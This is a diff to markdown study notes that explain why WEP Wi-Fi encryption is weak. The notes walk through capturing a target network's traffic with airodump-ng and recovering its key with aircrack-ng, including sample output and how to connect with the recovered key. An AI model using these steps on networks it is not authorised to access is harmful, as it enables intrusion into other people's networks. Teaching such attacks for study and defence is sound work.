@@ -1,5 +1,14 @@
 # Network Hacking - Gaining Access WEP Cracking
 
+<!-- TOC -->
+- [Network Hacking - Gaining Access WEP Cracking](#network-hacking---gaining-access-wep-cracking)
+  - [Theory behing cracking WEP Encryption](#theory-behing-cracking-wep-encryption)
+  - [WEP Capturing Basics](#wep-capturing-basics)
+  - [Fake Authentication Attack](#fake-authentication-attack)
+
+---
+
+
 ![WEP encryption algorithm diagram](../imgs/WEP-encryption-algorithm-37.ppm.png)
 
 - Everything we did so for now didn't require us to have access/connection to the network.
@@ -56,21 +65,88 @@ sequenceDiagram
   - But, before sending this into the air, WEP will also append the IV to the packet. The reason why it does so is so that once the router recieves the packet, it needs to be able to decrypt it, and to do so it need the key and the IV. But, the router already has the key no need to send that, therefore we just need to send the IV.
   - So, when the router recieves the packet, it has the IV, it has the password, so it can generate the key stream, and than use it to transform the gebrish data into it's orignal form, and read the packet.
 
-```mermaid
-sequenceDiagram
-    participant Client as Client
-    participant Air as Wireless Transmission
-    participant Router as Router
+    ```mermaid
+    sequenceDiagram
+        participant Client as Client
+        participant Air as Wireless Transmission
+        participant Router as Router
 
-    Client->>Client: Prepare Text Message
-    Client->>Client: Generate 24-bit IV
-    Client->>Client: Combine IV + Password → Key Stream
-    Client->>Client: Encrypt Text Message with Key Stream → Ciphertext
-    Client->>Client: Append IV to Ciphertext
-    Client->>Air: Send [IV + Ciphertext] over air
-    Air->>Router: Deliver [IV + Ciphertext]
-    Router->>Router: Extract IV from Packet
-    Router->>Router: Combine IV + Password → Key Stream
-    Router->>Router: Decrypt Ciphertext with Key Stream → Original Text
-    Router->>Router: Read Original Text
+        Client->>Client: Prepare Text Message
+        Client->>Client: Generate 24-bit IV
+        Client->>Client: Combine IV + Password → Key Stream
+        Client->>Client: Encrypt Text Message with Key Stream → Ciphertext
+        Client->>Client: Append IV to Ciphertext
+        Client->>Air: Send [IV + Ciphertext] over air
+        Air->>Router: Deliver [IV + Ciphertext]
+        Router->>Router: Extract IV from Packet
+        Router->>Router: Combine IV + Password → Key Stream
+        Router->>Router: Decrypt Ciphertext with Key Stream → Original Text
+        Router->>Router: Read Original Text
+    ```
+
+- Now, I guess we can see the problem here. The IV is only 24 bits long, which means it can only have 2^24 different values, which is around 16 million values. This means that if we send enough packets, we will eventually start to repeat the IVs.
+- IVs are really short only 24bits, that too sent in plain text.
+- If, we are on a busy network IVs will repeat, this makes WEP vulnerable to statistical attacks.
+- Repeated IVs let's you easily determine the key stream used to encrypt the data, and break the encryption.
+
+    ```mermaid
+    flowchart LR
+        IV["IV - 24 bits"] --> WEP["WEP Packet"]
+        Data["Encrypted Data / Ciphertext"] --> WEP
+        ICV["ICV - Integrity Check Value, 32 bits"] --> WEP
+    ```
+
+## WEP Capturing Basics
+
+- In order to crack WEP, we need to capture large number of packets from the network.
+- Analyze the captured packets using `aircrack-ng` to find the key.
+- First use the command `airodump-ng` to see the available networks and clients.
+
+    ```bash
+    airodump-ng wlan0 --band abg
+    ```
+
+- Once, listed look for the network with WEP Encryption, and note down the BSSID (MAC address of the access point) and the channel it is on.
+- One of the key requirements for this attack to be succesfull is this must be a busy network, so that we can capture enough packets.
+
+>[!WARNING]
+> If the network is idle the process can be a little more complex, and may require you to use some other techniques like ARP request replay attack, or fake authentication attack to generate more traffic.
+
+- Copy the BSSID and channel of the `target network` using `WEP` encryption.
+- Now, we can start capturing packets using `airodump-ng` command.
+
+```bash
+root@kali:~# airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0
 ```
+
+>[!NOTE]
+>Wait for some time to capture enough packets, the number of packets should be `at least 1000000`, anything less than that may not be enough to crack the WEP key.
+
+- Now, we will run `aircrack-ng` command to crack the WEP key against the `.cap` file we just created.
+
+    ```bash
+    root@kali:~# aircrack-ng capture-01.cap
+    ```
+
+- You will see the output similar to this:
+
+    ```
+    Opening capture-01.cap
+    Read 328704 packets.
+    #    BSSID              ESSID              Encryption
+    1    DEVICE_MAC_ADDRESS  TARGET_NETWORK_NAME  WEP (155258 IVs)
+    Choosing first network as target.
+    Operating capture-01.cap
+    Attack will be restarted every 5000 captured ivs.
+    Starting PTW attack with 156072 ivs.
+           KEY FOUND! [ XX:XX:XX:XX:XX:XX ] (ASCII: ASCII_PASSWORD)
+    Decrypted correctly 100%
+    ...
+
+- We can now use `XX:XX:XX:XX:XX:XX` or `ASCII_PASSWORD` to connect to the network.
+
+- To use `XX:XX:XX:XX:XX:XX` remove the colons and use it as the password to connect to the network.
+
+## Fake Authentication Attack
+
+- 
